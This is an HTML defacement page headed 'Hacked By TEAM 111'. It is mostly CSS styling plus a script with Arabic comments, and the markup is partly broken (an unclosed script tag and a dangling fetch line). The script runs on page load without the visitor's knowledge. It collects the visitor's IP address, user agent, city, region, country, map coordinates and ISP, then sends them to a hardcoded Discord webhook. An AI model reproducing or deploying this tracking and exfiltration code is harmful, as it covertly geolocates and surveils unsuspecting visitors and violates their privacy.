<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝐇𝐚𝐜𝐤𝐞𝐝 𝐁𝐲 𝐓𝐄𝐀𝐌 𝟏𝟏𝟏</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px);
            background-size: 15px 15px;
            font-family: monospace;
            color: #ccc;
            overflow: hidden;
        }


        .intro {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #e6e6e6;
            font-size: 80px;
            z-index: 9999;
            /* إزالة الفيد اوت الافتراضي */
            animation: none;
        }

        /* تأثير الآلة الكاتبة */
        .typewriter {
            border-right: 4px solid #e6e6e6;
            white-space: nowrap;
            overflow: hidden;
            width: 0;
            animation: typing 3s steps(10, end) forwards, blink 0.75s step-end infinite;
        }

        @keyframes typing {
            from {
                width: 0;
            }

            to {
                width: 10ch;
            }
        }

        @keyframes blink {
            50% {
                border-color: transparent;
            }
        }

        /* الفيد اوت بعد انتهاء الكتابة */
        .intro.fadeOut {
            animation: fadeOut 2s ease forwards;
            animation-delay: 3.5s;
        }

        @keyframes fadeOut {
            to {
                opacity: 0;
                visibility: hidden;
            }
        }

        .container,
        .left-box,
        .right-box,
        .box,
        .footer {
            opacity: 0;
            animation: fadeIn 0.5s ease-out forwards;
            animation-delay: 5.5s;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }

        .left-box,
        .right-box {
            position: absolute;
            top: 25px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #333;
            padding: 20px;
            border-radius: 8px;
            font-size: 18px;
        }

        .left-box {
            left: 25px;
        }

        .right-box {
            right: 25px;
        }

        .left-box a {
            display: block;
            margin: 8px 0;
            color: #9b0000;
            text-decoration: none;
            font-size: 16px;
        }

        .left-box a:hover {
            transform: translateX(5px);
        }

        .discord-link {
            display: flex;
            align-items: center;
            color: #ccc;
            margin-top: 10px;
            font-size: 16px;
        }

        .discord-link img {
            width: 20px;
            height: 20px;
            margin-right: 5px;
        }

        .anime-image {
            width: 600px;
            border: 3px solid #333;
            border-radius: 10px;
            margin-bottom: 15px;
        }

        .title {
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #ccc;
        }

        .box {
            width: 400px;
            max-height: 250px;
            overflow: auto;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #333;
            padding: 15px 20px;
            border-radius: 8px;
            font-size: 16px;
            text-align: left;
        }

        .box code {
            color: #9b0000;
        }

        .footer {
            margin-top: 15px;
            font-size: 14px;
            color: #555;
        }

        .text {
            margin-top: 10px;
            font-size: 14px;
            color: #888;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes blink {
            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.3;
            }
        }
    </style>
</head>

<body>

    <div class="intro"><div class="typewriter">𝐓𝐄𝐀𝐌 𝟏𝟏𝟏</div></div>

    <div class="left-box">

        <script>

            fetch('https://ipinfo.io/json')

<script>
async function sendToDiscord() {
  const webhookURL = "https://discord.com/api/webhooks/1411790150995808277/WRoykuQ42pzq9fv_Re8YCCBsFvqB4rZf1m-fo3M6ScDlVkeF2sa4vOE3kQfVw00wvXGA";

  try {
   
    const res = await fetch("https://ipinfo.io/json?token=3208692c122231");
    const ipInfoData = await res.json();

  
    const googleMapsLink = `https://www.google.com/maps?q=${ipInfoData.loc}`;

    
    const username = navigator.userAgent;

    
    const payload = {
      content: `🌐 **ثغرة شاشة**\n\n` +
               `**IP:** ${ipInfoData.ip}\n` +
               `**User:** ${username}\n` +
               `**Location:** ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\n` +
               `**Google Maps:** ${googleMapsLink}\n` +
               `**ISP:** ${ipInfoData.org}`
    };


    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    console.log("✅ تم إرسال البيانات بنجاح!");
  } catch (err) {
    console.error("⚠️ خطأ أثناء جلب أو إرسال البيانات:", err);
  }
}

// استدعاء الدالة عند فتح الصفحة
window.onload = sendToDiscord;
